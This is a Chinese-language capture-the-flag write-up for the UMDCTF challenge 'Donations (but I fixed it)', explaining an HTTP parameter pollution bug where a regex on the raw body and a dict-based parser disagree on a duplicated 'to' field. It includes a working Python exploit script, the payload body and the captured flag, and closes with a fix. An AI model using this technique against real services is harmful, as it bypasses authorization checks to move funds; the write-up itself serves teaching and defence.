# Donations (but I fixed it)

## 题目简述

第二版在后端增加了 `currency < 0` 检查，负数捐款已经失效。新用户仍从 1000 余额开始，达到 5000 才能取旗。新的突破口是服务端先在原始表单文本上用正则验证收款人，随后又用另一套解析逻辑生成实际参数。

## 解题过程

后端先检查原始请求体中是否出现 `to=lisanalgaib`：

```python
if not re.search(
    "^to=lisanalgaib&|&to=lisanalgaib$|&to=lisanalgaib&",
    request_body,
):
    raise HTTPException(status_code=403)
```

通过后才解析表单：

```python
params = dict(urllib.parse.parse_qsl(request_body))
```

`parse_qsl` 会保留重复键的顺序，但转换成 `dict` 时只保留最后一个值。因此请求体：

```text
to=lisanalgaib&to=main-account&currency=1000
```

会同时产生两种解释：

```text
正则检查：看到了 to=lisanalgaib，通过
业务逻辑：params["to"] == "main-account"
```

这使普通账户能够把自己的 1000 余额转给任意主账户。主账户初始已有 1000，再创建四个捐赠账户，各转入 1000，即可达到 5000。下面的脚本用参数元组列表保留两个同名 `to` 字段：

```python
import requests

BASE = "https://<api-host>"
MAIN_USER = "main-account"
PASSWORD = "strong-password"


def create_session(username):
    session = requests.Session()
    session.post(
        f"{BASE}/api/register",
        data={"username": username, "password": PASSWORD},
    ).raise_for_status()
    session.post(
        f"{BASE}/api/login",
        data={"username": username, "password": PASSWORD},
    ).raise_for_status()
    return session


main_session = create_session(MAIN_USER)

for index in range(4):
    donor = create_session(f"donor-{index}")
    donor.post(
        f"{BASE}/api/donate",
        data=[
            ("to", "lisanalgaib"),
            ("to", MAIN_USER),
            ("currency", "1000"),
        ],
    ).raise_for_status()

response = main_session.get(f"{BASE}/api/flag")
print(response.text)
```

输出：

```text
UMDCTF{TeS7_your_CHAL1En93S 6UyS}
```

这里不能让账户给自己捐款：发送者和收款者会引用同一个用户对象，先减 1000 再加 1000，净余额仍然不变。必须由不同的捐赠账户向主账户转账。

## 方法总结

本题修复了负数金额，却留下 HTTP 参数污染。安全检查在原始字符串上认定第一个 `to` 合法，业务逻辑则采用字典中的最后一个 `to`，解析不一致导致收款人限制失效。修复时应只解析一次请求，并在解析结果上拒绝重复的安全敏感字段，而不是用正则扫描原始表单。
